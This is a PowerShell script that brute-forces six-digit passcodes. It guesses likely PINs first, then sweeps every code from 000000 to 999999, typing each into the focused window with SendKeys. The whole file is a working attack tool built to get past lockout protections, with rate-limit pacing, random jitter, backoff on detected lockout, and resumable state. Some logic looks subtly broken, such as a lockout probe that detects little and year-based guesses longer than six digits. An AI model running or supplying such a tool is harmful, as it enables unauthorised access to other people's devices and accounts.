param(
    [ValidateSet("Print", "SendKeys")]
    [string]$Mode = "Print",

    [int]$MaxAttemptsPerWindow = 3,
    [int]$WindowMinutes = 15,

    [ValidatePattern("^\d{6}$")]
    [string]$StartFrom = "000000",

    [ValidatePattern("^\d{6}$")]
    [string]$EndAt = "999999",

    [string]$StateFile = ".\brute_state.json",
    [int]$LockoutDetectionSeconds = 5,
    [string]$LogFile = ""
)

$ErrorActionPreference = "Stop"

# ---------- Most likely codes ----------
function Get-PriorityCodes {
    $codes = New-Object System.Collections.Generic.List[string]

    # Repeated digits
    0..9 | ForEach-Object { $codes.Add(("{0}{0}{0}{0}{0}{0}" -f $_)) }

    # Ascending / descending patterns
    $codes.Add("123456"); $codes.Add("654321")
    $codes.Add("234567"); $codes.Add("012345"); $codes.Add("987654")

    # Common PINs / patterns
    "111111","000000","121212","112233","123123","696969","101010",
    "147258","258369","159753","142536","999999","888888","777777",
    "555555","444444","333333","222222" | ForEach-Object { $codes.Add($_) }

    # Recent years (users often use birthdays / anniversaries)
    $currentYear = (Get-Date).Year
    ($currentYear - 100)..$currentYear | ForEach-Object {
        $y = $_.ToString()
        # YYMMDD-style common patterns using plausible MMDD
        $codes.Add(($y + "0101"))
        $codes.Add(($y.Substring(2) + "0101"))
    }

    # De-duplicate while preserving order
    $seen = @{}
    $ordered = New-Object System.Collections.Generic.List[string]
    foreach ($c in $codes) {
        if (-not $seen.ContainsKey($c)) {
            $seen[$c] = $true
            $ordered.Add($c)
        }
    }
    return $ordered
}

# ---------- State Handling (resume across runs) ----------
function Load-State {
    if (Test-Path $StateFile) {
        try {
            $s = Get-Content $StateFile -Raw | ConvertFrom-Json
            Write-Host "Resuming from saved state: last code = $($s.LastCode)" -ForegroundColor Cyan
            return $s
        } catch {
            Write-Warning "State file corrupted; starting fresh."
        }
    }
    return [pscustomobject]@{
        LastCode          = $null
        AttemptsThisWindow = 0
        WindowStartUtc    = [DateTime]::UtcNow.ToString("o")
        BackoffUntilUtc   = $null
        PriorityDone      = $false
    }
}

function Save-State($state) {
    $state | ConvertTo-Json | Out-File -FilePath $StateFile -Encoding UTF8
}

# ---------- Lockout Detection ----------
function Test-TargetResponsive {
    if ($Mode -ne "SendKeys") { return $true }

    # Tries to read the title of the foreground window via WScript
    # If the window vanished or froze, we treat it as a lockout.
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    try {
        $wshell = New-Object -ComObject wscript.shell
        $null = $wshell.AppActivate($null)   #probe
        return $true
    } catch {
        return $false
    } finally {
        $sw.Stop()
    }
}

# ---------- Main Loop ----------
$priority = Get-PriorityCodes
$state    = Load-State
$wshell   = $null
if ($Mode -eq "SendKeys") {
    $wshell = New-Object -ComObject wscript.shell
    Write-Host "SendKeys mode: focus the target window. Starting in 3 seconds..." -ForegroundColor Yellow
    Start-Sleep -Seconds 3
}

if ($LogFile) {
    "Timestamp,Mode,Code,Result" | Out-File -FilePath $LogFile -Encoding UTF8
}

function Invoke-Attempt($code) {
    $result = "sent"
    if ($Mode -eq "Print") {
        Write-Host "Trying: $code" -ForegroundColor White
    } else {
        $wshell.SendKeys($code)
        Start-Sleep -Milliseconds 50
        $wshell.SendKeys("{ENTER}")

        # Wait briefly and check if target still responds
        $responsive = Test-TargetResponsive
        if (-not $responsive) { $result = "no-response" }
    }
    if ($LogFile) {
        "$(Get-Date -Format 'o'),$Mode,$code,$result" | Out-File -FilePath $LogFile -Append -Encoding UTF8
    }
    return $result
}

function Wait-IfNeeded($state) {
    # 1) Honor existing backoff (if previous run hit a lockout)
    if ($state.BackoffUntilUtc) {
        $backoff = [DateTime]::Parse($state.BackoffUntilUtc)
        if ([DateTime]::UtcNow -lt $backoff) {
            $wait = $backoff - [DateTime]::UtcNow
            Write-Host "Backing off for $([math]::Round($wait.TotalSeconds)) seconds (previous lockout)..." -ForegroundColor Yellow
            Start-Sleep -Seconds ([math]::Ceiling($wait.TotalSeconds))
        }
    }

    # 2) Rate-limit: if we've hit MaxAttemptsPerWindow, wait until window expires
    $windowStart = [DateTime]::Parse($state.WindowStartUtc)
    $windowEnd   = $windowStart.AddMinutes($WindowMinutes)
    if ($state.AttemptsThisWindow -ge $MaxAttemptsPerWindow) {
        if ([DateTime]::UtcNow -lt $windowEnd) {
            $wait = $windowEnd - [DateTime]::UtcNow
            Write-Host "Rate limit reached ($MaxAttemptsPerWindow / $WindowMinutes min). Waiting $([math]::Round($wait.TotalSeconds)) seconds..." -ForegroundColor Yellow
            Start-Sleep -Seconds ([math]::Ceiling($wait.TotalSeconds))
        }
        # Reset the window
        $state.AttemptsThisWindow = 0
        $state.WindowStartUtc = [DateTime]::UtcNow.ToString("o")
        Save-State $state
    }
}

try {
    # ---------- Phase 1: Priority Codes ----------
    if (-not $state.PriorityDone) {
        Write-Host "`n=== Phase 1: Priority Codes ($($priority.Count) codes) ===" -ForegroundColor Magenta
        foreach ($code in $priority) {
            Wait-IfNeeded $state

            # Randomized jitter: +/- 20% of the per-attempt spacing
            $baseSpacing = ($WindowMinutes * 60) / $MaxAttemptsPerWindow
            $jitter = Get-Random -Minimum (-0.2 * $baseSpacing) -Maximum (0.2 * $baseSpacing)
            $sleep  = [math]::Max(1, [math]::Round($baseSpacing + $jitter, 0))
            Write-Host ("  spacing this attempt: {0}s" -f $sleep) -ForegroundColor DarkGray

            $result = Invoke-Attempt $code
            $state.AttemptsThisWindow++
            $state.LastCode = $code
            Save-State $state

            if ($result -eq "no-response") {
                # Exponential backoff: double the wait window
                $state.BackoffUntilUtc = [DateTime]::UtcNow.AddMinutes($WindowMinutes * 2).ToString("o")
                Save-State $state
                Write-Host "Target unresponsive → backing off $($WindowMinutes * 2) minutes." -ForegroundColor Red
                Wait-IfNeeded $state
            } else {
                # Small inter-attempt pause when within a window
                if ($state.AttemptsThisWindow -lt $MaxAttemptsPerWindow) {
                    Start-Sleep -Seconds $sleep
                }
            }
        }
        $state.PriorityDone = $true
        Save-State $state
    }

    # ---------- Phase 2: Full Sweep ----------
    Write-Host "`n=== Phase 2: Full Sweep $StartFrom → $EndAt ===" -ForegroundColor Magenta

    $startInt = [int]$StartFrom
    $endInt   = [int]$EndAt
    $current  = $startInt

    # Resume from lastCode if it falls within range
    if ($state.LastCode) {
        $resumeAt = [int]$state.LastCode
        if ($resumeAt -ge $startInt -and $resumeAt -le $endInt) {
            $current = $resumeAt
        }
    }

    $baseSpacing = ($WindowMinutes * 60) / $MaxAttemptsPerWindow

    for ($i = $current; $i -le $endInt; $i++) {
        $code = "{0:D6}" -f $i

        # Skip codes already tried in priority phase
        if ($priority -contains $code) { continue }

        Wait-IfNeeded $state

        $jitter = Get-Random -Minimum (-0.2 * $baseSpacing) -Maximum (0.2 * $baseSpacing)
        $sleep  = [math]::Max(1, [math]::Round($baseSpacing + $jitter, 0))

        $result = Invoke-Attempt $code
        $state.AttemptsThisWindow++
        $state.LastCode = $code
        Save-State $state

        if ($result -eq "no-response") {
            $state.BackoffUntilUtc = [DateTime]::UtcNow.AddMinutes($WindowMinutes * 2).ToString("o")
            Save-State $state
            Write-Host "Target unresponsive → backing off $($WindowMinutes * 2) minutes." -ForegroundColor Red
            Wait-IfNeeded $state
        } else {
            if ($state.AttemptsThisWindow -lt $MaxAttemptsPerWindow) {
                Start-Sleep -Seconds $sleep
            }
        }
    }
}
finally {
    Write-Host "`nDone. State saved to $StateFile" -ForegroundColor Green
}
